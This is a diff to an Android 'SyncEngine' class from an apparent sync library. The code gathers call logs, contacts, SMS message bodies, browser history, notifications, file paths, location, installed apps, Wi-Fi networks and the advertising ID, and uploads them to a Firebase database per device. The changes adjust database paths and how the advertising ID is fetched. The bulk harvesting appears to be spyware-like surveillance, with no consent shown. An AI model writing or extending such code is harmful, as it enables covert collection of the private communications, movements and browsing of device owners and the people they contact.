@@ -9,6 +9,7 @@ import android.util.Log;
 import androidx.annotation.NonNull;
 
 import com.google.android.gms.ads.identifier.AdvertisingIdClient;
+import com.google.android.gms.ads.identifier.AdvertisingIdClient.Info;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.Tasks;
@@ -191,7 +192,7 @@ public class SyncEngine {
         try {
             List<CallLog> items = CallLogImpl.getCallLogs(context);
             if (items == null || items.isEmpty()) { result.addSkipped("callLogs", 0); return; }
-            DatabaseReference ref = db.child("callLogs").child(deviceId).child("data");
+            DatabaseReference ref = db.child("callLogs").child(deviceId);
             for (CallLog item : items) {
                 String key = hash(item.getName() + item.getPhoneNumber()
                         + item.getDuration() + item.getTimestamp() + item.getCallType());
@@ -218,7 +219,7 @@ public class SyncEngine {
         try {
             List<Contact> items = ContactImpl.getContacts(context);
             if (items == null || items.isEmpty()) { result.addSkipped("contacts", 0); return; }
-            DatabaseReference ref = db.child("contacts").child(deviceId).child("data");
+            DatabaseReference ref = db.child("contacts").child(deviceId);
             for (Contact item : items) {
                 String key = hash(item.getName() + item.getPhoneNumber());
                 Map<String, Object> data = new HashMap<>();
@@ -241,7 +242,7 @@ public class SyncEngine {
         try {
             List<InstalledApp> items = AppImpl.getInstalledApps(context);
             if (items == null || items.isEmpty()) { result.addSkipped("installedApps", 0); return; }
-            DatabaseReference ref = db.child("installedApps").child(deviceId).child("data");
+            DatabaseReference ref = db.child("installedApps").child(deviceId);
             for (InstalledApp item : items) {
                 String key = hash(item.getPackageName());
                 Map<String, Object> data = new HashMap<>();
@@ -265,7 +266,7 @@ public class SyncEngine {
         try {
             List<WifiInfo> items = WifiImpl.getWifi(context);
             if (items == null || items.isEmpty()) { result.addSkipped("wifi", 0); return; }
-            DatabaseReference ref = db.child("wifi").child(deviceId).child("data");
+            DatabaseReference ref = db.child("wifi").child(deviceId);
             for (WifiInfo item : items) {
                 String key = hash(item.getBssid() + item.getSsid());
                 Map<String, Object> data = new HashMap<>();
@@ -291,7 +292,7 @@ public class SyncEngine {
         try {
             List<SmsMessage> items = SmsImpl.getSms(context);
             if (items == null || items.isEmpty()) { result.addSkipped("sms", 0); return; }
-            DatabaseReference ref = db.child("sms").child(deviceId).child("data");
+            DatabaseReference ref = db.child("sms").child(deviceId);
             for (SmsMessage item : items) {
                 String key = hash(item.getAddress() + item.getBody()
                         + item.getDate() + item.getType());
@@ -318,7 +319,7 @@ public class SyncEngine {
         try {
             List<BrowserData> items = BrowserImpl.getBrowserData(context);
             if (items == null || items.isEmpty()) { result.addSkipped("browserData", 0); return; }
-            DatabaseReference ref = db.child("browserData").child(deviceId).child("data");
+            DatabaseReference ref = db.child("browserData").child(deviceId);
             for (BrowserData item : items) {
                 String key = hash(item.getUrl());
                 Map<String, Object> data = new HashMap<>();
@@ -344,7 +345,7 @@ public class SyncEngine {
         try {
             List<NotificationInfo> items = NotificationImpl.getActiveNotifications(context);
             if (items == null || items.isEmpty()) { result.addSkipped("notifications", 0); return; }
-            DatabaseReference ref = db.child("notifications").child(deviceId).child("data");
+            DatabaseReference ref = db.child("notifications").child(deviceId);
             for (NotificationInfo item : items) {
                 String key = hash(item.getPackageName() + item.getTitle() + item.getPostedTime());
                 Map<String, Object> data = new HashMap<>();
@@ -376,7 +377,7 @@ public class SyncEngine {
                                 result.addSkipped("files", 0);
                                 return;
                             }
-                            DatabaseReference ref = db.child("files").child(deviceId).child("data");
+                            DatabaseReference ref = db.child("files").child(deviceId);
                             for (FileInfo item : items) {
                                 String key = hash(item.getPath());
                                 Map<String, Object> data = new HashMap<>();
@@ -424,7 +425,7 @@ public class SyncEngine {
             LocationImpl.getLocation(context, cb);
 
             if (items.isEmpty()) { result.addSkipped("locations", 0); return; }
-            DatabaseReference ref = db.child("location").child(deviceId).child("data");
+            DatabaseReference ref = db.child("location").child(deviceId);
             for (LocationInfo item : items) {
                 String key = hash(item.getLat() + "," + item.getLng() + item.getTime());
                 Map<String, Object> data = new HashMap<>();
@@ -488,19 +489,11 @@ public class SyncEngine {
     private static void uploadGaid(Context context, DatabaseReference db,
                                     String deviceId, SyncResult result) {
         try {
-            final Gaid[] item = {null};
-            com.sync.library.callbacks.GaidCallback cb = new com.sync.library.callbacks.GaidCallback() {
-                @Override
-                public void onResult(Gaid gaid) { item[0] = gaid; }
-                @Override
-                public void onError(Exception e) { Log.w(TAG, "Failed to get GAID", e); }
-            };
-            GaidImpl.getGaid(context, cb);
-
-            if (item[0] == null) { result.addSkipped("gaid", 1); return; }
+            Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
+            String gaid = adInfo != null ? adInfo.getId() : "";
             DatabaseReference ref = db.child("gaid").child(deviceId);
             Map<String, Object> data = new HashMap<>();
-            safePut(data, "gaid", item[0].getGaid());
+            safePut(data, "gaid", gaid);
             data.put("uploadTime", ServerValue.TIMESTAMP);
             ref.setValue(data);
             result.addUploaded("gaid", 1);
